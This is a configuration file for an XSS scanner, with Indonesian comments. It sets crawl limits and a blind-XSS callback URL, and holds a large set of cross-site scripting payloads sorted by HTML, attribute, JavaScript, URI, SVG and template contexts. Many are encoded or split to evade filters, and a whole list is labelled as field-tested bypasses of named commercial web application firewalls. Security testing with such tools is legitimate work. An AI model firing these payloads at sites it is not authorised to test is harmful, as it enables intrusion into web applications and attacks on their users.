# config.py

from datetime import datetime
from pathlib import Path
from typing import Final

# --- Global Configuration ---
USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/115.0.0.0 Safari/537.36"
    "MCN-Prime-aux-bogues"
)
REQUEST_TIMEOUT: Final[int] = 15  # dalam detik
# Jittered delay antara request, dalam detik (min, max)
REQUEST_DELAY_MIN: Final[float] = 0.3
REQUEST_DELAY_MAX: Final[float] = 1.0

MAX_URLS_TO_CRAWL: Final[int] = 30
MAX_DEPTH_CRAWL: Final[int] = 6
MAX_WORKERS: Final[int] = 5

# --- Logging / Paths ---
LOG_DIR = Path("logs")
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / f"xsscanner_{datetime.now():%Y%m%d_%H%M%S}.log"

# --- Context-aware minimal payload seeds ---
# Dirancang ringkas tapi menutup mayoritas kasus umum; engine akan melakukan
# mutasi ringan & kontekstual secara terkontrol (bukan brute-force buta).
CONTEXT_MIN_PAYLOADS = {
    # ------------------------------------------------------------------ #
    #  HTML text nodes                                                     #
    # ------------------------------------------------------------------ #
    "html_tag": [
        "</textarea><svg onload=alert(1)>",
        '"><svg/onload=alert(1)>',
        # Break out dari title/textarea lalu inject
        "</title><svg/onload=alert(1)>",
        "</textarea><img src=x onerror=alert(1)>",
    ],

    # ------------------------------------------------------------------ #
    #  Attribute contexts                                                  #
    # ------------------------------------------------------------------ #
    "attr_dq": [
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) x="',
        '"><img src=x onerror=alert(1)>',
        # Unicode escape — bypass filter yang cek karakter literal
        '\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022',
    ],
    "attr_sq": [
        "' autofocus onfocus=alert(1) x='",
        "'><img src=x onerror=alert(1)>",
    ],
    "attr_unquoted": [
        "onmouseover=alert(1) x=1",
        "onfocus=alert(1) autofocus",
    ],

    # ------------------------------------------------------------------ #
    #  JS string contexts                                                  #
    # ------------------------------------------------------------------ #
    "js_string_dq": [
        '";alert(1);//',
        '"-alert(1)-"',
    ],
    "js_string_sq": [
        "';alert(1);//",
        "'-alert(1)-'",
    ],

    # ------------------------------------------------------------------ #
    #  URL / URI scheme vectors                                            #
    # ------------------------------------------------------------------ #
    "uri_scheme": [
        "javascript:alert(1)",
        "javascript:{ alert`1` }",
        "data:text/html,<script>alert(1)</script>",
        # Bypass filter javascript: dengan karakter kontrol
        "&#01;javascript:alert(1)",
        "jav%0Dascript:alert(1)",
        "javascript&colon;confirm(1)",
        # Cloudflare / iframe newline bypass
        "javascript:%0aalert(1)",
    ],

    # ------------------------------------------------------------------ #
    #  CSS vectors                                                         #
    # ------------------------------------------------------------------ #
    "css_url": [
        '<div style="background-image:url(javascript:alert(1))">x</div>',
    ],
    "css_expression": [
        '<p style="width:expression(alert(1))">x</p>',
    ],

    # ------------------------------------------------------------------ #
    #  SVG / MathML                                                        #
    # ------------------------------------------------------------------ #
    "svg": [
        "<svg><script href=data:,alert(1) />",
        "<svg onload=alert(1)>",
        # Mixed case — bypass filter case-sensitive
        "<sVg/OnLoAd=alert(1)>",
        # Cloudflare bypass
        "<Svg Only=1 OnLoad=alert(1)>",
        # Newline bypass (Akamai / generic WAF)
        "<svg%0Aonload=alert(1)>",
        "<svg%0D%0Aonload=alert(1)>",
        # Pointer event — bypass onload filter
        "<sVg OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`\">",
    ],

    # ------------------------------------------------------------------ #
    #  Event handler / img vectors                                         #
    # ------------------------------------------------------------------ #
    "event_handler": [
        "<img src=x onerror=alert(1)>",
        # Akamai null byte bypass
        "<img sr%00c=x o%00nerror=((pro%00mpt(1)))>",
        # eval + base64 — bypass keyword filter (alert/confirm/prompt)
        "<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>",
        # Break out dari attribute lalu inject img
        '"><img src=x onerror=eval(atob`YWxlcnQoMSk=`)>',
        # Tab sebagai separator spasi
        "<img%09src=x%09onerror=alert(1)>",
        # String.fromCharCode — bypass keyword filter total
        "<img src=x onerror=this.innerHTML=String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)>",
    ],

    # ------------------------------------------------------------------ #
    #  Script tag vectors                                                  #
    # ------------------------------------------------------------------ #
    "script_tag": [
        "<script>alert(1)</script>",
        # Backtick — bypass () filter
        "<script>alert`1`</script>",
        # .call() / .apply() — bypass direct function name filter
        "<script>alert.call(null,1)</script>",
        "<script>alert.apply(null,[1])</script>",
        "<script>confirm.call(null,1)</script>",
        # onerror throw — bypass filter berbasis kata kunci
        "<script>{onerror=alert}throw 1</script>",
        # eval.call + hex encode
        "<script>eval.call`${'alert\\x2823\\x29'}`</script>",
        # /regex/.source split — bypass filter yang cek string "alert" utuh
        "<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click",
        # JSFuck-style (alert tanpa kata "alert")
        "<script>$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+\"($)\")()</script>",
        # AWS WAF bypass — prepend <!
        "<!<script>confirm(1)</script>",
        # Null bytes sebelum tag
        "%00%00<script>alert(1)</script>",
    ],

    # ------------------------------------------------------------------ #
    #  Details / interactive element vectors                               #
    # ------------------------------------------------------------------ #
    "interactive": [
        "<details open ontoggle=alert(1)>",
        "<details open ontoggle=confirm(1)>",
        # Accesskey — no-click XSS (Alt+Shift+x)
        '<input type="text" value="XSS" accesskey="x" onclick="alert(1)">',
    ],

    # ------------------------------------------------------------------ #
    #  Anchor / href vectors                                               #
    # ------------------------------------------------------------------ #
    "anchor": [
        '<a href="javascript:alert(1)">Click</a>',
        '<a href="&#01;javascript:alert(1)">Click</a>',
        '<a href="javascript:{ alert`0` }">Click</a>',
        '<a src="google.com" onclick="alert(1)">Click</a>',
        # Sucuri CloudProxy
        '<a href=javascript&colon;confirm(1)>Click</a>',
        # ModSecurity CRS
        '<a href="jav%0Dascript&colon;alert(1)">Click</a>',
        # Wordfence
        '<a href=&#01javascript:alert(1)>Click</a>',
        # DotDefender
        '<bleh/ondragstart=&Tab;parent&Tab;[\'open\']&Tab;&lpar;&rpar; draggable=True>dragme',
    ],

    # ------------------------------------------------------------------ #
    #  iframe vectors                                                      #
    # ------------------------------------------------------------------ #
    "iframe": [
        # Cloudflare — newline dalam src URI
        "<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>",
        "<iframe src=//14.rs>",
        "<form><button formaction=http://14.rs>Hacked</form>",
    ],

    # ------------------------------------------------------------------ #
    #  Polyglot — satu payload, banyak konteks                            #
    # ------------------------------------------------------------------ #
    "polyglot": [
        '"--><svg/onload=alert(1)>',
        "'--><script>alert(1)</script><!--",
        # Polyglot komprehensif
        "-->'\"//></sCript><deTailS open x=\">\" ontoggle=(co\\u006efirm)``>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\ x3e",
    ],

    # ------------------------------------------------------------------ #
    #  Template engine injection                                           #
    # ------------------------------------------------------------------ #
    "template_engine": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{this.constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "<%= alert(1) %>",
    ],

    # ------------------------------------------------------------------ #
    #  WAF-specific bypass collection (field-tested)                      #
    # ------------------------------------------------------------------ #
    "waf_bypass": [
        # --- Akamai ---
        "<img sr%00c=x o%00nerror=((pro%00mpt(1)))>",
        "<svg%0Aonload=alert(1)>",
        "<svg%0D%0Aonload=alert(1)>",
        # --- Tencent Cloud WAF ---
        '"><img src=x onerror=eval(atob`YWxlcnQoMSk=`)>',
        "<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>",
        # --- Cloudflare ---
        "<Svg Only=1 OnLoad=alert(1)>",
        "<script>{onerror=alert}throw 1</script>",
        "<script>eval.call`${'alert\\x2823\\x29'}`</script>",
        # --- AWS WAF ---
        "<!<script>confirm(1)</script>",
        # --- Imperva Incapsula ---
        "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>",
        # --- DotDefender ---
        "<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar; draggable=True>dragme",
        # --- Sucuri CloudProxy (POST) ---
        "<a href=javascript&colon;confirm(1)>Click</a>",
        # --- ModSecurity CRS ---
        '<a href="jav%0Dascript&colon;alert(1)">Click</a>',
        # --- Wordfence ---
        "<a href=&#01javascript:alert(1)>Click</a>",
        # --- Generic WAF — encode variants ---
        "%u003Csvg onload=alert(1)>",
        "%u3008svg onload=alert(2)>",
        "%uFF1Csvg onload=alert(3)>",
        "%253Csvg%2Fonload%3Dalert(1)%253E",  # double URL encode
    ],
}

# ------------------------------------------------------------------ #
#  OAST / Blind XSS base URL                                          #
# ------------------------------------------------------------------ #
# Override via ENV: OAST_BASE_URL atau XSS_OOB_BASE_URL
# Contoh: "https://oast.example/t" (tanpa slash akhir)
try:
    import os as _os
    OAST_BASE_URL = (
        _os.getenv("OAST_BASE_URL")
        or _os.getenv("XSS_OOB_BASE_URL")
        or ""
    )
except Exception:
    OAST_BASE_URL = ""

# ------------------------------------------------------------------ #
#  Quality & Performance knobs                                         #
# ------------------------------------------------------------------ #
# Mutasi maksimal per konteks sebelum scoring
MAX_MUTATIONS_PER_CONTEXT: Final[int] = 12
# Batas total sequence payload per parameter (progressive)
MAX_SEQUENCE_TOTAL: Final[int] = 150
# Crawler "paralel" — memakai satu Playwright context (sesi terjaga)
CRAWLER_CONCURRENCY: Final[int] = 2
# Rate-limit minimal antar request/navigasi per origin (detik)
ORIGIN_MIN_DELAY: Final[float] = 0.35
# Playwright browser pool size (reduce cold start)
BROWSER_POOL_SIZE: Final[int] = 2